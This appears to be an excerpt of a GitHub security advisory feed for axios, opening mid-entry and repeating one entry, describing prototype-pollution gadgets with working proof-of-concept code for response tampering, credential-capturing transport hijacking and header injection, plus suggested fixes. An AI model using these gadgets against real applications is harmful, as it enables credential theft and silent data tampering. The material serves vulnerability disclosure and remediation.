<p>A plain <code>{}</code> inherits from <code>Object.prototype</code>. <code>mergeConfig</code> only iterates <code>Object.keys({ ...config1, ...config2 })</code> (<a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L99">line 99</a>), which is a spread of own properties. Any key that is absent from both <code>this.defaults</code> and the per-request config will never be set as an own property on the merged config. Reading that key later on the merged config falls through to <code>Object.prototype</code>. That is the root mechanism behind all gadgets below.</p>
<hr>
<h2 id="gadget-1-parsereviver----response-tampering-and-exfiltration">Gadget 1: parseReviver -- response tampering and exfiltration</h2>
<p><strong>Introduced in:</strong> v1.12.0 (commit 2a97634, PR #5926)
<strong>Affected range:</strong> &gt;= 1.12.0, &lt;= 1.13.6</p>
<h3 id="root-cause">Root cause</h3>
<p>The default <code>transformResponse</code> function calls <a href="https://github.com/axios/axios/blob/v1.13.6/lib/defaults/index.js#L124"><code>JSON.parse(data, this.parseReviver)</code></a>:</p>
<pre><code class="language-js">return JSON.parse(data, this.parseReviver);
</code></pre>
<p><code>this</code> is the merged config. <code>parseReviver</code> is not present in <code>defaults</code> and is not in the <code>mergeMap</code> inside <code>mergeConfig</code>. It is never set as an own property on the merged config. Accessing <code>this.parseReviver</code> therefore walks the prototype chain.</p>
<p>The call fires by default on every string response body because <a href="https://github.com/axios/axios/blob/v1.13.6/lib/defaults/transitional.js#L5"><code>lib/defaults/transitional.js#L5</code></a> sets:</p>
<pre><code class="language-js">forcedJSONParsing: true,
</code></pre>
<p>which activates the JSON parse path unconditionally when <code>responseType</code> is unset.</p>
<p><code>JSON.parse(text, reviver)</code> calls the reviver for every key-value pair in the parsed result, bottom-up. The reviver's return value is what the caller receives. An attacker-controlled reviver can both observe every key-value pair and silently replace values.</p>
<p>There is no interaction with <code>assertOptions</code> here. The <code>assertOptions</code> call in <code>Axios._request</code> (<a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/Axios.js#L119">line 119</a>) iterates <code>Object.keys(config)</code>, and since <code>parseReviver</code> was never set as an own property, it is not in that list. Nothing validates or invokes the polluted function before <code>transformResponse</code> does.</p>
<h3 id="verification-own-property-check">Verification: own-property check</h3>
<pre><code class="language-js">import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const mergeConfig = require('./lib/core/mergeConfig.js').default;
const defaults = require('./lib/defaults/index.js').default;

const merged = mergeConfig(defaults, { url: '/test', method: 'get' });
console.log(Object.prototype.hasOwnProperty.call(merged, 'parseReviver')); // false
console.log(merged.parseReviver); // undefined (no pollution)

Object.prototype.parseReviver = function(k, v) { return v; };
console.log(merged.parseReviver); // [Function (anonymous)] -- inherited
delete Object.prototype.parseReviver;
</code></pre>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>Two terminals. The server simulates a legitimate API endpoint. The client simulates a Node.js application whose process has been affected by prototype pollution from a co-dependency.</p>
<p><strong>Terminal 1 -- server (<code>server_gadget1.mjs</code>):</strong></p>
<pre><code class="language-js">import http from 'http';

const server = http.createServer((req, res) =&gt; {
  console.log('[server] request:', req.method, req.url);
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ role: 'user', balance: 100, token: 'tok_real_abc' }));
});

server.listen(19003, '127.0.0.1', () =&gt; {
  console.log('[server] listening on 127.0.0.1:19003');
});
</code></pre>
<pre><code>$ node server_gadget1.mjs
[server] listening on 127.0.0.1:19003
[server] request: GET /
</code></pre>
<p><strong>Terminal 2 -- client (<code>poc_parsereviver.mjs</code>):</strong></p>
<pre><code class="language-js">import axios from 'axios';

// Simulate pollution arriving from a co-dependency (e.g. lodash &lt; 4.17.21 via _.merge).
// In a real application this would be set before any axios request runs.
Object.prototype.parseReviver = function (key, value) {
  // Called for every key-value pair in every JSON response parsed by axios in this process.
  if (key !== '') {
    // Exfiltrate: in a real attack this would POST to an attacker-controlled endpoint.
    console.log('[exfil]', key, '=', JSON.stringify(value));
  }
  // Tamper: escalate role, inflate balance.
  if (key === 'role') return 'admin';
  if (key === 'balance') return 999999;
  return value;
};

const res = await axios.get('http://127.0.0.1:19003/');
console.log('[app] received:', JSON.stringify(res.data));

delete Object.prototype.parseReviver;
</code></pre>
<pre><code>$ node poc_parsereviver.mjs
[exfil] role = "user"
[exfil] balance = 100
[exfil] token = "tok_real_abc"
[app] received: {"role":"admin","balance":999999,"token":"tok_real_abc"}
</code></pre>
<p>The server sent <code>role: user</code>. The application received <code>role: admin</code>. The response is silently modified in place; no error is thrown, no log entry is produced.</p>
<hr>
<h2 id="gadget-2-transport----full-http-request-hijacking-with-credentials">Gadget 2: transport -- full HTTP request hijacking with credentials</h2>
<p><strong>Introduced in:</strong> early adapter refactor, present across 0.x and 1.x
<strong>Affected range:</strong> &gt;= 0.19.0, &lt;= 1.13.6 (Node.js http adapter only)</p>
<h3 id="root-cause-1">Root cause</h3>
<p>Inside the Node.js http adapter at <a href="https://github.com/axios/axios/blob/v1.13.6/lib/adapters/http.js#L676"><code>lib/adapters/http.js#L676</code></a>:</p>
<pre><code class="language-js">if (config.transport) {
  transport = config.transport;
}
</code></pre>
<p><code>transport</code> is listed in <code>mergeMap</code> inside <code>mergeConfig</code> (<a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L88">line 88</a>):</p>
<pre><code class="language-js">transport: defaultToConfig2,
</code></pre>
<p>but it is not present in <a href="https://github.com/axios/axios/blob/v1.13.6/lib/defaults/index.js"><code>lib/defaults/index.js</code></a> at all. <code>mergeConfig</code> iterates <code>Object.keys({ ...config1, ...config2 })</code> (<a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L99">line 99</a>). Since <code>config1</code> (the defaults) has no <code>transport</code> key and a typical per-request config has none either, the key never enters the loop. It is never set as an own property on the merged config. The read at line 676 falls through to <code>Object.prototype</code>.</p>
<p>The fix in v1.13.5 (PR #7369) added a <code>hasOwnProp</code> check for <code>mergeMap</code> access, but the iteration set itself is the issue -- <code>transport</code> simply never enters it. The fix does not address this.</p>
<p>The transport interface is <code>{ request(options, handleResponseCallback) }</code>. The options object passed to <code>transport.request</code> at adapter runtime contains:</p>
<ul>
<li><code>options.hostname</code>, <code>options.port</code>, <code>options.path</code> -- full target URL</li>
<li><code>options.auth</code> -- basic auth credentials in <code>"username:password"</code> form (set at <a href="https://github.com/axios/axios/blob/v1.13.6/lib/adapters/http.js#L606">line 606</a>)</li>
<li><code>options.headers</code> -- all request headers as a plain object</li>
</ul>
<h3 id="proof-of-concept-1">Proof of concept</h3>
<p>Two terminals. The server is a legitimate API endpoint that processes the request normally. The client's process has been affected by prototype pollution.</p>
<p><strong>Terminal 1 -- server (<code>server_gadget2.mjs</code>):</strong></p>
<pre><code class="language-js">import http from 'http';

const server = http.createServer((req, res) =&gt; {
  console.log('[server] request:', req.method, req.url, 'auth:', req.headers.authorization || '(none)');
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end('{"ok":true}');
});

server.listen(19002, '127.0.0.1', () =&gt; {
  console.log('[server] listening on 127.0.0.1:19002');
});
</code></pre>
<pre><code>$ node server_gadget2.mjs
[server] listening on 127.0.0.1:19002
[server] request: GET /api/users auth: Basic c3ZjX2FjY291bnQ6aHVudGVyMg==
</code></pre>
<p><strong>Terminal 2 -- client (<code>poc_transport.mjs</code>):</strong></p>
<pre><code class="language-js">import axios from 'axios';
import http from 'http';

Object.prototype.transport = {
  request(options, handleResponse) {
    // Intercept: called for every outbound request in this process.
    console.log('[hijack] target:', options.hostname + ':' + options.port + options.path);
    console.log('[hijack] auth:', options.auth);
    console.log('[hijack] headers:', JSON.stringify(options.headers));
    // Forward to the real transport so the caller sees a normal 200.
    return http.request(options, handleResponse);
  },
};

const res = await axios.get('http://127.0.0.1:19002/api/users', {
  auth: { username: 'svc_account', password: 'hunter2' },
});
console.log('[app] response status:', res.status);

delete Object.prototype.transport;
</code></pre>
<pre><code>$ node poc_transport.mjs
[hijack] target: 127.0.0.1:19002/api/users
[hijack] auth: svc_account:hunter2
[hijack] headers: {"Accept":"application/json, text/plain, */*","User-Agent":"axios/1.13.6","Accept-Encoding":"gzip, compress, deflate, br"}
[app] response status: 200
</code></pre>
<p>The basic auth credentials are fully visible to the attacker's transport function. The request completes normally from the caller's perspective.</p>
<hr>
<h2 id="additional-gadget-transformrequest--transformresponse">Additional gadget: transformRequest / transformResponse</h2>
<p>Separately, <code>mergeConfig</code> reads <code>config2[prop]</code> at <a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L102">line 102</a> without a <code>hasOwnProperty</code> guard. For keys like <code>transformRequest</code> and <code>transformResponse</code> that are present in <code>defaults</code> (and therefore processed by the mergeMap loop), if <code>Object.prototype.transformRequest</code> is polluted before the request, <code>config2["transformRequest"]</code> inherits the polluted value and <code>defaultToConfig2</code> replaces the safe default transforms with the attacker's function.</p>
<p>This one requires a discriminator because <code>assertOptions</code> in <code>Axios._request</code> (<a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/Axios.js#L119">line 119</a>) reads <code>schema[opt]</code> for every key in the merged config's own keys, and <code>schema["transformRequest"]</code> also inherits from <code>Object.prototype</code>, causing it to call the polluted value as a validator. The gadget function needs to return <code>true</code> when its first argument is a function (the assertOptions call) and perform the attack when its first argument is data (the <a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/transformData.js#L22"><code>transformData</code></a> call).</p>
<p>Both <code>transformRequest</code> (fires with request body) and <code>transformResponse</code> (fires with response body) are confirmed affected. Range: &gt;= 0.19.0, &lt;= 1.13.6.</p>
<hr>
<h2 id="why-the-existing-fix-does-not-cover-these">Why the existing fix does not cover these</h2>
<p>PR #7369 / CVE-2026-25639 (fixed in v1.13.5) addressed a separate class: passing <code>{"__proto__": {"x": 1}}</code> as the config object, which caused <code>mergeMap['__proto__']</code> to resolve to <code>Object.prototype</code> (a non-function), crashing axios. The fix added an explicit block on <code>__proto__</code>, <code>constructor</code>, and <code>prototype</code> as config keys, and changed <code>mergeMap[prop]</code> to <code>utils.hasOwnProp(mergeMap, prop) ? mergeMap[prop] : ...</code>.</p>
<p>That fix only addresses config keys that are explicitly set to <code>__proto__</code> (or similar) by the caller. It does not add <code>hasOwnProperty</code> guards on the value reads (<code>config2[prop]</code> at <a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L102">line 102</a>, <code>this.parseReviver</code>, <code>config.transport</code>). An application using a PP-vulnerable co-dependency and making axios requests is still fully exposed after upgrading to 1.13.5 or 1.13.6.</p>
<hr>
<h2 id="suggested-fixes">Suggested fixes</h2>
<p>For <code>parseReviver</code> (<a href="https://github.com/axios/axios/blob/v1.13.6/lib/defaults/index.js#L124"><code>lib/defaults/index.js#L124</code></a>):</p>
<pre><code class="language-js">const reviver = Object.prototype.hasOwnProperty.call(this, 'parseReviver') ? this.parseReviver : undefined;
return JSON.parse(data, reviver);
</code></pre>
<p>For <code>mergeConfig</code> value reads (<a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L102"><code>lib/core/mergeConfig.js#L102</code></a>):</p>
<pre><code class="language-js">const configValue = merge(
  config1[prop],
  utils.hasOwnProp(config2, prop) ? config2[prop] : undefined,
  prop
);
</code></pre>
<p>For <code>transport</code> and other adapter reads from config (<a href="https://github.com/axios/axios/blob/v1.13.6/lib/adapters/http.js#L676"><code>lib/adapters/http.js#L676</code></a>):</p>
<pre><code class="language-js">if (utils.hasOwnProp(config, 'transport') &amp;&amp; config.transport) {
  transport = config.transport;
}
</code></pre>
<p>The same <code>hasOwnProp</code> pattern applies to <code>lookup</code>, <code>httpVersion</code>, <code>http2Options</code>, <code>family</code>, and <code>formSerializer</code> reads in the adapter.</p>
<hr>
<h2 id="environment">Environment</h2>
<ul>
<li>axios: 1.13.6</li>
<li>Node.js: 22.22.0</li>
<li>OS: macOS 14</li>
<li>Reproduction: confirmed in isolated test harness, both gadgets independently verified</li>
</ul>
<h2 id="disclosure">Disclosure</h2>
<p>Reported via GitHub Security Advisories at <a href="https://github.com/axios/axios/security/advisories/new">https://github.com/axios/axios/security/advisories/new</a> per the axios security policy.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-pf86-5x62-jrwf">https://github.com/axios/axios/security/advisories/GHSA-pf86-5x62-jrwf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42033">https://nvd.nist.gov/vuln/detail/CVE-2026-42033</a></li>
<li><a href="https://github.com/advisories/GHSA-pf86-5x62-jrwf">https://github.com/advisories/GHSA-pf86-5x62-jrwf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pf86-5x62-jrwf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T00:26:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios: Prototype Pollution Gadgets - Response Tampering, Data Exfiltration, and Request Hijacking]]></title>
        <id>https://github.com/advisories/GHSA-pf86-5x62-jrwf</id>
        <link href="https://github.com/advisories/GHSA-pf86-5x62-jrwf"/>
        <updated>2026-05-05T00:26:30.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>When <code>Object.prototype</code> has been polluted by any co-dependency with keys that axios reads without a <code>hasOwnProperty</code> guard, an attacker can (a) silently intercept and modify every JSON response before the application sees it, or (b) fully hijack the underlying HTTP transport, gaining access to request credentials, headers, and body. The precondition is prototype pollution from a separate source in the same process -- lodash &lt; 4.17.21, or any of several other common npm packages with known PP vectors. The two gadgets confirmed here work independently.</p>
<hr>
<h2 id="background-how-mergeconfig-builds-the-config-object">Background: how mergeConfig builds the config object</h2>
<p>Every axios request goes through <code>Axios._request</code> in <a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/Axios.js#L76"><code>lib/core/Axios.js#L76</code></a>:</p>
<pre><code class="language-js">config = mergeConfig(this.defaults, config);
</code></pre>
<p>Inside <code>mergeConfig</code>, the merged config is built as a plain <code>{}</code> object (<a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L20"><code>lib/core/mergeConfig.js#L20</code></a>):</p>
<pre><code class="language-js">const config = {};
</code></pre>
<p>A plain <code>{}</code> inherits from <code>Object.prototype</code>. <code>mergeConfig</code> only iterates <code>Object.keys({ ...config1, ...config2 })</code> (<a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L99">line 99</a>), which is a spread of own properties. Any key that is absent from both <code>this.defaults</code> and the per-request config will never be set as an own property on the merged config. Reading that key later on the merged config falls through to <code>Object.prototype</code>. That is the root mechanism behind all gadgets below.</p>
<hr>
<h2 id="gadget-1-parsereviver----response-tampering-and-exfiltration">Gadget 1: parseReviver -- response tampering and exfiltration</h2>
<p><strong>Introduced in:</strong> v1.12.0 (commit 2a97634, PR #5926)
<strong>Affected range:</strong> &gt;= 1.12.0, &lt;= 1.13.6</p>
<h3 id="root-cause">Root cause</h3>
<p>The default <code>transformResponse</code> function calls <a href="https://github.com/axios/axios/blob/v1.13.6/lib/defaults/index.js#L124"><code>JSON.parse(data, this.parseReviver)</code></a>:</p>
<pre><code class="language-js">return JSON.parse(data, this.parseReviver);
</code></pre>
<p><code>this</code> is the merged config. <code>parseReviver</code> is not present in <code>defaults</code> and is not in the <code>mergeMap</code> inside <code>mergeConfig</code>. It is never set as an own property on the merged config. Accessing <code>this.parseReviver</code> therefore walks the prototype chain.</p>
<p>The call fires by default on every string response body because <a href="https://github.com/axios/axios/blob/v1.13.6/lib/defaults/transitional.js#L5"><code>lib/defaults/transitional.js#L5</code></a> sets:</p>
<pre><code class="language-js">forcedJSONParsing: true,
</code></pre>
<p>which activates the JSON parse path unconditionally when <code>responseType</code> is unset.</p>
<p><code>JSON.parse(text, reviver)</code> calls the reviver for every key-value pair in the parsed result, bottom-up. The reviver's return value is what the caller receives. An attacker-controlled reviver can both observe every key-value pair and silently replace values.</p>
<p>There is no interaction with <code>assertOptions</code> here. The <code>assertOptions</code> call in <code>Axios._request</code> (<a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/Axios.js#L119">line 119</a>) iterates <code>Object.keys(config)</code>, and since <code>parseReviver</code> was never set as an own property, it is not in that list. Nothing validates or invokes the polluted function before <code>transformResponse</code> does.</p>
<h3 id="verification-own-property-check">Verification: own-property check</h3>
<pre><code class="language-js">import { createRequire } from 'module';
const require = createRequire(import.meta.url);
const mergeConfig = require('./lib/core/mergeConfig.js').default;
const defaults = require('./lib/defaults/index.js').default;

const merged = mergeConfig(defaults, { url: '/test', method: 'get' });
console.log(Object.prototype.hasOwnProperty.call(merged, 'parseReviver')); // false
console.log(merged.parseReviver); // undefined (no pollution)

Object.prototype.parseReviver = function(k, v) { return v; };
console.log(merged.parseReviver); // [Function (anonymous)] -- inherited
delete Object.prototype.parseReviver;
</code></pre>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>Two terminals. The server simulates a legitimate API endpoint. The client simulates a Node.js application whose process has been affected by prototype pollution from a co-dependency.</p>
<p><strong>Terminal 1 -- server (<code>server_gadget1.mjs</code>):</strong></p>
<pre><code class="language-js">import http from 'http';

const server = http.createServer((req, res) =&gt; {
  console.log('[server] request:', req.method, req.url);
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({ role: 'user', balance: 100, token: 'tok_real_abc' }));
});

server.listen(19003, '127.0.0.1', () =&gt; {
  console.log('[server] listening on 127.0.0.1:19003');
});
</code></pre>
<pre><code>$ node server_gadget1.mjs
[server] listening on 127.0.0.1:19003
[server] request: GET /
</code></pre>
<p><strong>Terminal 2 -- client (<code>poc_parsereviver.mjs</code>):</strong></p>
<pre><code class="language-js">import axios from 'axios';

// Simulate pollution arriving from a co-dependency (e.g. lodash &lt; 4.17.21 via _.merge).
// In a real application this would be set before any axios request runs.
Object.prototype.parseReviver = function (key, value) {
  // Called for every key-value pair in every JSON response parsed by axios in this process.
  if (key !== '') {
    // Exfiltrate: in a real attack this would POST to an attacker-controlled endpoint.
    console.log('[exfil]', key, '=', JSON.stringify(value));
  }
  // Tamper: escalate role, inflate balance.
  if (key === 'role') return 'admin';
  if (key === 'balance') return 999999;
  return value;
};

const res = await axios.get('http://127.0.0.1:19003/');
console.log('[app] received:', JSON.stringify(res.data));

delete Object.prototype.parseReviver;
</code></pre>
<pre><code>$ node poc_parsereviver.mjs
[exfil] role = "user"
[exfil] balance = 100
[exfil] token = "tok_real_abc"
[app] received: {"role":"admin","balance":999999,"token":"tok_real_abc"}
</code></pre>
<p>The server sent <code>role: user</code>. The application received <code>role: admin</code>. The response is silently modified in place; no error is thrown, no log entry is produced.</p>
<hr>
<h2 id="gadget-2-transport----full-http-request-hijacking-with-credentials">Gadget 2: transport -- full HTTP request hijacking with credentials</h2>
<p><strong>Introduced in:</strong> early adapter refactor, present across 0.x and 1.x
<strong>Affected range:</strong> &gt;= 0.19.0, &lt;= 1.13.6 (Node.js http adapter only)</p>
<h3 id="root-cause-1">Root cause</h3>
<p>Inside the Node.js http adapter at <a href="https://github.com/axios/axios/blob/v1.13.6/lib/adapters/http.js#L676"><code>lib/adapters/http.js#L676</code></a>:</p>
<pre><code class="language-js">if (config.transport) {
  transport = config.transport;
}
</code></pre>
<p><code>transport</code> is listed in <code>mergeMap</code> inside <code>mergeConfig</code> (<a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L88">line 88</a>):</p>
<pre><code class="language-js">transport: defaultToConfig2,
</code></pre>
<p>but it is not present in <a href="https://github.com/axios/axios/blob/v1.13.6/lib/defaults/index.js"><code>lib/defaults/index.js</code></a> at all. <code>mergeConfig</code> iterates <code>Object.keys({ ...config1, ...config2 })</code> (<a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L99">line 99</a>). Since <code>config1</code> (the defaults) has no <code>transport</code> key and a typical per-request config has none either, the key never enters the loop. It is never set as an own property on the merged config. The read at line 676 falls through to <code>Object.prototype</code>.</p>
<p>The fix in v1.13.5 (PR #7369) added a <code>hasOwnProp</code> check for <code>mergeMap</code> access, but the iteration set itself is the issue -- <code>transport</code> simply never enters it. The fix does not address this.</p>
<p>The transport interface is <code>{ request(options, handleResponseCallback) }</code>. The options object passed to <code>transport.request</code> at adapter runtime contains:</p>
<ul>
<li><code>options.hostname</code>, <code>options.port</code>, <code>options.path</code> -- full target URL</li>
<li><code>options.auth</code> -- basic auth credentials in <code>"username:password"</code> form (set at <a href="https://github.com/axios/axios/blob/v1.13.6/lib/adapters/http.js#L606">line 606</a>)</li>
<li><code>options.headers</code> -- all request headers as a plain object</li>
</ul>
<h3 id="proof-of-concept-1">Proof of concept</h3>
<p>Two terminals. The server is a legitimate API endpoint that processes the request normally. The client's process has been affected by prototype pollution.</p>
<p><strong>Terminal 1 -- server (<code>server_gadget2.mjs</code>):</strong></p>
<pre><code class="language-js">import http from 'http';

const server = http.createServer((req, res) =&gt; {
  console.log('[server] request:', req.method, req.url, 'auth:', req.headers.authorization || '(none)');
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end('{"ok":true}');
});

server.listen(19002, '127.0.0.1', () =&gt; {
  console.log('[server] listening on 127.0.0.1:19002');
});
</code></pre>
<pre><code>$ node server_gadget2.mjs
[server] listening on 127.0.0.1:19002
[server] request: GET /api/users auth: Basic c3ZjX2FjY291bnQ6aHVudGVyMg==
</code></pre>
<p><strong>Terminal 2 -- client (<code>poc_transport.mjs</code>):</strong></p>
<pre><code class="language-js">import axios from 'axios';
import http from 'http';

Object.prototype.transport = {
  request(options, handleResponse) {
    // Intercept: called for every outbound request in this process.
    console.log('[hijack] target:', options.hostname + ':' + options.port + options.path);
    console.log('[hijack] auth:', options.auth);
    console.log('[hijack] headers:', JSON.stringify(options.headers));
    // Forward to the real transport so the caller sees a normal 200.
    return http.request(options, handleResponse);
  },
};

const res = await axios.get('http://127.0.0.1:19002/api/users', {
  auth: { username: 'svc_account', password: 'hunter2' },
});
console.log('[app] response status:', res.status);

delete Object.prototype.transport;
</code></pre>
<pre><code>$ node poc_transport.mjs
[hijack] target: 127.0.0.1:19002/api/users
[hijack] auth: svc_account:hunter2
[hijack] headers: {"Accept":"application/json, text/plain, */*","User-Agent":"axios/1.13.6","Accept-Encoding":"gzip, compress, deflate, br"}
[app] response status: 200
</code></pre>
<p>The basic auth credentials are fully visible to the attacker's transport function. The request completes normally from the caller's perspective.</p>
<hr>
<h2 id="additional-gadget-transformrequest--transformresponse">Additional gadget: transformRequest / transformResponse</h2>
<p>Separately, <code>mergeConfig</code> reads <code>config2[prop]</code> at <a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L102">line 102</a> without a <code>hasOwnProperty</code> guard. For keys like <code>transformRequest</code> and <code>transformResponse</code> that are present in <code>defaults</code> (and therefore processed by the mergeMap loop), if <code>Object.prototype.transformRequest</code> is polluted before the request, <code>config2["transformRequest"]</code> inherits the polluted value and <code>defaultToConfig2</code> replaces the safe default transforms with the attacker's function.</p>
<p>This one requires a discriminator because <code>assertOptions</code> in <code>Axios._request</code> (<a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/Axios.js#L119">line 119</a>) reads <code>schema[opt]</code> for every key in the merged config's own keys, and <code>schema["transformRequest"]</code> also inherits from <code>Object.prototype</code>, causing it to call the polluted value as a validator. The gadget function needs to return <code>true</code> when its first argument is a function (the assertOptions call) and perform the attack when its first argument is data (the <a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/transformData.js#L22"><code>transformData</code></a> call).</p>
<p>Both <code>transformRequest</code> (fires with request body) and <code>transformResponse</code> (fires with response body) are confirmed affected. Range: &gt;= 0.19.0, &lt;= 1.13.6.</p>
<hr>
<h2 id="why-the-existing-fix-does-not-cover-these">Why the existing fix does not cover these</h2>
<p>PR #7369 / CVE-2026-25639 (fixed in v1.13.5) addressed a separate class: passing <code>{"__proto__": {"x": 1}}</code> as the config object, which caused <code>mergeMap['__proto__']</code> to resolve to <code>Object.prototype</code> (a non-function), crashing axios. The fix added an explicit block on <code>__proto__</code>, <code>constructor</code>, and <code>prototype</code> as config keys, and changed <code>mergeMap[prop]</code> to <code>utils.hasOwnProp(mergeMap, prop) ? mergeMap[prop] : ...</code>.</p>
<p>That fix only addresses config keys that are explicitly set to <code>__proto__</code> (or similar) by the caller. It does not add <code>hasOwnProperty</code> guards on the value reads (<code>config2[prop]</code> at <a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L102">line 102</a>, <code>this.parseReviver</code>, <code>config.transport</code>). An application using a PP-vulnerable co-dependency and making axios requests is still fully exposed after upgrading to 1.13.5 or 1.13.6.</p>
<hr>
<h2 id="suggested-fixes">Suggested fixes</h2>
<p>For <code>parseReviver</code> (<a href="https://github.com/axios/axios/blob/v1.13.6/lib/defaults/index.js#L124"><code>lib/defaults/index.js#L124</code></a>):</p>
<pre><code class="language-js">const reviver = Object.prototype.hasOwnProperty.call(this, 'parseReviver') ? this.parseReviver : undefined;
return JSON.parse(data, reviver);
</code></pre>
<p>For <code>mergeConfig</code> value reads (<a href="https://github.com/axios/axios/blob/v1.13.6/lib/core/mergeConfig.js#L102"><code>lib/core/mergeConfig.js#L102</code></a>):</p>
<pre><code class="language-js">const configValue = merge(
  config1[prop],
  utils.hasOwnProp(config2, prop) ? config2[prop] : undefined,
  prop
);
</code></pre>
<p>For <code>transport</code> and other adapter reads from config (<a href="https://github.com/axios/axios/blob/v1.13.6/lib/adapters/http.js#L676"><code>lib/adapters/http.js#L676</code></a>):</p>
<pre><code class="language-js">if (utils.hasOwnProp(config, 'transport') &amp;&amp; config.transport) {
  transport = config.transport;
}
</code></pre>
<p>The same <code>hasOwnProp</code> pattern applies to <code>lookup</code>, <code>httpVersion</code>, <code>http2Options</code>, <code>family</code>, and <code>formSerializer</code> reads in the adapter.</p>
<hr>
<h2 id="environment">Environment</h2>
<ul>
<li>axios: 1.13.6</li>
<li>Node.js: 22.22.0</li>
<li>OS: macOS 14</li>
<li>Reproduction: confirmed in isolated test harness, both gadgets independently verified</li>
</ul>
<h2 id="disclosure">Disclosure</h2>
<p>Reported via GitHub Security Advisories at <a href="https://github.com/axios/axios/security/advisories/new">https://github.com/axios/axios/security/advisories/new</a> per the axios security policy.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/axios/axios/security/advisories/GHSA-pf86-5x62-jrwf">https://github.com/axios/axios/security/advisories/GHSA-pf86-5x62-jrwf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-42033">https://nvd.nist.gov/vuln/detail/CVE-2026-42033</a></li>
<li><a href="https://github.com/advisories/GHSA-pf86-5x62-jrwf">https://github.com/advisories/GHSA-pf86-5x62-jrwf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pf86-5x62-jrwf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T00:26:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[axios] Axios: Header Injection via Prototype Pollution]]></title>
        <id>https://github.com/advisories/GHSA-6chq-wfr3-2hj9</id>
        <link href="https://github.com/advisories/GHSA-6chq-wfr3-2hj9"/>
        <updated>2026-05-05T00:25:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A prototype pollution gadget exists in the Axios HTTP adapter (lib/adapters/http.js) that allows an attacker to inject arbitrary HTTP headers into outgoing requests. The vulnerability exploits duck-type checking of the data payload, where if Object.prototype is polluted with getHeaders, append, pipe, on, once, and Symbol.toStringTag, Axios misidentifies any plain object payload as a FormData instance and calls the attacker-controlled getHeaders() function, merging the returned headers into the outgoing request.</p>
<p>The vulnerable code resides exclusively in lib/adapters/http.js. The prototype pollution source does not need to originate from Axios itself — any prototype pollution primitive in any dependency in the application's dependency tree is sufficient to trigger this gadget.</p>
<p>Prerequisites:</p>
<p>A prototype pollution primitive must exist somewhere in the application's dependency chain (e.g., via lodash.merge, qs, JSON5, or any deep-merge utility processing attacker-controlled input). The pollution source is not required to be in Axios.
The application must use Axios to make HTTP requests with a data payload (POST, PUT, PATCH).</p>
<h3 id="details">Details</h3>
<p>The vulnerability is in <code>lib/adapters/http.js</code>, in the data serialization pipeline:</p>
<pre><code class="language-javascript">// lib/adapters/http.js 
} else if (utils.isFormData(data) &amp;&amp; utils.isFunction(data.getHeaders)) {
    headers.set(data.getHeaders());
    // ...
}
</code></pre>
<p>Axios uses two sequential duck-type checks, both of which can be satisfied via prototype pollution:</p>
<p><strong>1. <code>utils.isFormData(data)</code> — <code>lib/utils.js</code></strong></p>
<pre><code class="language-javascript">const isFormData = (thing) =&gt; {
  let kind;
  return thing &amp;&amp; (
    (typeof FormData === 'function' &amp;&amp; thing instanceof FormData) || (
      isFunction(thing.append) &amp;&amp; ( 
        (kind = kindOf(thing)) === 'formdata' ||  
        (kind === 'object' &amp;&amp; isFunction(thing.toString) &amp;&amp; thing.toString() === '[object FormData]')
      )
    )
  )
}
</code></pre>
<p><strong>2. <code>utils.isFunction(data.getHeaders)</code> — Duck-type for <code>form-data</code> npm package</strong></p>
<pre><code class="language-javascript">// Returns true if Object.prototype.getHeaders is a function
utils.isFunction(data.getHeaders) 
</code></pre>
<h3 id="poc">PoC</h3>
<pre><code class="language-javascript">// Simulate Prototype Pollution
Object.prototype[Symbol.toStringTag] = 'FormData';
Object.prototype.append = () =&gt; {};
Object.prototype.getHeaders = () =&gt; {
    const headers = Object.create(null);
    (.... Introduce here all the headers you want ....)
    return headers;
};
Object.prototype.pipe = function(d) { if(d&amp;&amp;d.end)d.end(); return d; };
Object.prototype.on = function() { return this; };
Object.prototype.once = function() { return this; };

